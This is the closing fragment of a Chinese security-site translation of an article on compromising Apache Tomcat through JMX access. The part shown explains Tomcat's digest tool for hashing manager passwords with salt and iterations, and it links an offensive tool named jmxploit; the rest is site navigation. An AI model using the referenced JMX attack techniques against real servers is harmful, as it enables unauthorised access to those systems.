<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">themanagersecretpassword:42052cec2459a6b4c383f2c43698d0528fe3f39756f8524763fc9e2997e77ebf1f1ba9bc0926b7395e32bb796e4ec0c1045e96c15c1edb510c2e295a5c11b095</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>注意，在上面的例子中，-s和-i参数分别用于设置salt的长度和迭代次数。</p>
<p>Digest工具还接受-a参数，来指定哈希算法。</p>
<p>根据Tomcat的推荐，当不使用-a参数，则默认使用SHA-512。</p>
<p>另外，应该注意不带-s和-i参数使用digest，将返回{salt}${iterations}${digest}格式的输出，例子如下：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">&gt;digest.bat themanagersecretpassword</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">themanagersecretpassword:92cd45d5db0f5794c794bf4fb0cc975347978d53673ec3c946a28c199c209995$1$a27648ca5671b33692ebb95a80720903dfd50b13da649b1d703ffc0260b2194ddec21616528bf4f6a99fb6b8fa724c6c518c2c45125b135b82c2ec16b060cb2f</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>上述的例子，关于salt的长度（字节）和迭代次数，使用默认值，</p>
<p>虽然作者写作是不知道，但是下面的工具在2014年由Jeremy Mousset创建，覆盖了本文讨论的一部分内容，且不涉及JConsole：https://github.com/jmxploit/jmxploit</p>
<p>【本文来源：<a href="http://bobao.360.cn/learning/detail/3478.html" target="_blank">安全客 </a>翻译  安全脉搏yuyang编整理发布】</p>
<p>原文链接:<a class="text-more" href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/february/compromising-apache-tomcat-via-jmx-access/" target="_blank">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/february/compromising-apache-tomcat-via-jmx-access/</a></p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/jconsole" rel="tag">JConsole</a><a href="https://www.secpulse.com/archives/tag/jmx%e6%8e%a5%e5%8f%a3" rel="tag">JMX接口</a><a href="https://www.secpulse.com/archives/tag/nmap" rel="tag">Nmap</a><a href="https://www.secpulse.com/archives/tag/tomcat%e6%9c%8d%e5%8a%a1%e5%99%a8" rel="tag">Tomcat服务器</a><a href="https://www.secpulse.com/archives/tag/%e6%9c%aa%e7%bb%8f%e6%8e%88%e6%9d%83" rel="tag">未经授权</a><a href="https://www.secpulse.com/archives/tag/%e6%9c%ac%e5%9c%b0%e7%9b%91%e8%a7%86" rel="tag">本地监视</a><a href="https://www.secpulse.com/archives/tag/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86" rel="tag">目录遍历</a><a href="https://www.secpulse.com/archives/tag/%e7%ae%a1%e7%90%86%e8%bf%9c%e7%a8%8btomcat" rel="tag">管理远程Tomcat</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/56049.html" title="详细阅读 Android 渗透测试学习手册（三）Android 应用的逆向和审计">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/02/1111111.png&h=150&w=249&zc=1" alt="Android 渗透测试学习手册（三）Android 应用的逆向和审计" class="xg-img"/>
		<p>Android 渗透测试学习手册（三）A&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/51509.html" title="详细阅读 浅谈内网渗透—安全小课堂第二十三期">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2016/08/esop_form.jpg&h=150&w=249&zc=1" alt="浅谈内网渗透—安全小课堂第二十三期" class="xg-img"/>
		<p>浅谈内网渗透—安全小课堂第二十三期</P></a></li>
				<li><a href="https://www.secpulse.com/archives/50494.html" title="详细阅读 渗透Hacking Team过程">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2016/07/HackingTeam.jpeg&h=150&w=249&zc=1" alt="渗透Hacking Team过程" class="xg-img"/>
		<p>渗透Hacking Team过程</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
	<h2 class="comments-title">
		抢沙发
	</h2>
			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='55367' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="01d53a651f" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="195"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/55367.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/01/tt1-150x150.jpg" width="96" height="96" alt="yuyang" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/yuyang" title="由yuyang发布" rel="author">yuyang</a><br>
 <span class="au-title">总共23篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
安全脉搏编辑~	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/8436.html" rel="bookmark" title="详细阅读 亿佰购物存储型xss">亿佰购物存储型xss</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/47247.html" rel="bookmark" title="详细阅读 泰康人寿安全策略过低导致员工账户密码泄露">泰康人寿安全策略过低导致员工账户密码泄露</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/16915.html" rel="bookmark" title="详细阅读 移动某业务逻辑缺陷，可进任意移动用户139邮箱与飞信">移动某业务逻辑缺陷，可进任意移动用户139邮箱与飞信</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/9195.html" rel="bookmark" title="详细阅读 36kr某重要后台弱口令">36kr某重要后台弱口令</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/6756.html" rel="bookmark" title="详细阅读 Php.net 被入侵">Php.net 被入侵</a></li>
					</ul>


</aside><aside id="text-11" class="widget-container widget_text"><div class="si-title"><h2>脉搏官方微信公众号</h2></div>			<div class="textwidget"><img src="https://www.secpulse.com/wp-includes/images/SecPulse.png" width="280px" height="364px" /></div>
		</aside>				</div>
	</div>

	</section>

  <div class="inner row visible-lg-block">

	<div class="friends">
		<h3>友情链接</h3>
		<ul>
			<li><a href="https://xianzhi.aliyun.com/forum/?secpulse" target="_blank">先知安全社区</a><span>|</span></li>
			<li><a href="https://threathunter.org/" target="_blank">ThreatHunter社区</a><span>|</span></li>
			<li><a href="http://www.ijiandao.com/" target="_blank">网络尖刀</a><span>|</span></li>
			<li><a href="http://navisec.it/" target="_blank">NaviSec导航</a><span>|</span></li>
		    <li><a href="https://www.easyaq.com/" target="_blank">E安全</a><span>|</span></li>
			<li><a href="http://www.sec-wiki.com/" target="_blank">Sec-Wiki</a><span>|</span></li>
			<li><a href="http://www.waitalone.cn/" target="_blank">独自等待</a><span>|</span></li>
			<li><a href="http://www.shellsec.com/" target="_blank">神刀网</a><span>|</span></li>
			<li><a href="http://www.ineice.com/" target="_blank">爱内测</a><span>|</span></li>
			<li><a href="http://www.itet.cn/" target="_blank">北京ITET培训中心</a><span>|</span></li>
			<li><a href="http://www.ihonker.org/" target="_blank">中国红客联盟</a><span>|</span></li>
			<li><a href="http://www.bigniu.com/" target="_blank">比戈大牛</a><span>|</span></li>
			<li><a href="http://www.tiejiang.org/" target="_blank">铁匠运维网</a><span>|</span></li>
			<li><a href="http://www.nagain.com" target="_blank">娜迦信息</a><span>|</span></li>
			<li><a href="https://www.secsilo.com/" target="_blank">SecSilo</a><span>|</span></li>
			<li><a href="https://team.armyzer0.com" target="_blank">armyzer0</a><span>|</span></li>
			<li><a href="http://www.nosafe.org" target="_blank">NoSafe</a></li>
		</ul>
	</div>

	<div class="friends">
		<h3>合作伙伴</h3>
		<ul>
			<a href="https://www.duoyinsu.com" class="external" target="_blank">
				<img src="https://www.secpulse.com/wp-content/uploads/anshi-logo.png"
				alt="安识科技" width="150px" height="45px">
			</a>
			<a href="http://aq.163.com/module/partner.html" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/netease.jpg"
				alt="网易安全中心" width="150px" height="45px">
			</a>
			<a href="https://security.alibaba.com/" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/asrc.jpg"
				alt="阿里安全中心" width="150px" height="45px">
			</a>
			
			<a href="http://yaq.qq.com/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/yaqnew.png" alt="腾讯御安全"
				width="140px" height="45px">
			</a>
			
			<a href="http://www.4hou.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/4hou.png"
				alt="嘶吼RoarTalk" width="150px" height="45px">
			</a>
			
			<a href="http://www.ichunqiu.com/?from=secpulse" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/ichunqiu.png" alt="i春秋学院"
				width="140px" height="45px">
			</a>

			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/bigsec.png" alt="bigsec岂安科技"
				width="140px" height="45px">
			</a>
		
			<a href="http://www.milw0rm.cn/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/milw0rm.png"
				alt="Milw0rm Team" width="120px" height="40px">
			</a>


			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/cloversec.png"
				alt="四叶草安全" width="130px" height="45px">
			</a>
			<a href="https://www.aqdog.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/aqdog.png"
				alt="安犬云平台" width="140px" height="45px">
			</a>
			
			<a href="http://www.e365.org/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/e365.png"
				alt="易安在线" width="130px" height="45px">
			</a>
			
			
			

		</ul>
	</div>
</div>
<footer class="footer clr" id="footer">
	<div class="inner inner-footer">
		<div class="footer-secpulse">
			<h3>SecPulse</h3>
			<ul>
				<li><a href="/about">关于SecPulse</a></li>
				<!--<li><a href="http://test.secpulse.com">SecPulse专测</a> <sup>NEW!</sup></li>-->
				<li><a href="/hire">加入我们</a></li>
				<li><a href="/report">寻求报道</a></li>
				<li><a href="/contact-us">联系我们</a></li>
			</ul>
		</div>
		<div class="footer-subscribe xs-hidden">
			<h3>订阅</h3>
			<ul>
				<li><a href="/feed">RSS订阅</a></li>
				<li><a href="/feed">邮箱订阅</a></li>
				<li><a href="/feed">线下活动订阅</a></li>
				<li></li>
				<li><a href="http://weibo.com/311057789">官方微博</a></li>
				<!-- <li><a href="https://twitter.com/secpulse">Twitter</a></li> -->
			</ul>
		</div>
		<div class="footer-partner">
			<h3>全力驱动</h3>
			<ul class="cf">
				<li><a href="https://www.secpulse.com" class="external"
					target="_blank"><img
						src="https://www.secpulse.com/wp-content/uploads/seclogo.png"
						alt="安全脉搏" width="200px"></a></li>
			</ul>
		</div>
		<div class="footer-copyright xs-hidden">
			<p>本站由SecPulse安全脉搏团队全力维护。</p>
			<p>
				Powered By <a title="安全脉搏" href="https://www.secpulse.com">SecPulse</a>
			</p>
			<p>©2013-2017 安全脉搏</p>
			<p>沪ICP备16016474号</p>
			<img src="https://www.secpulse.com/wp-includes/images/qrcode.jpg"
				alt="Qrcode" height="150px" width="150px">

		</div>
	</div>
</footer>
<div id="shangxia">
	<div id="shang" title="↑ 返回顶部"></div>
              <div id="comt" title="查看评论"></div>
              <div id="xia" title="↓ 移至底部"></div>
</div>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/plugins/akismet/_inc/form.js?ver=3.1.2'></script>
</body>

</html>
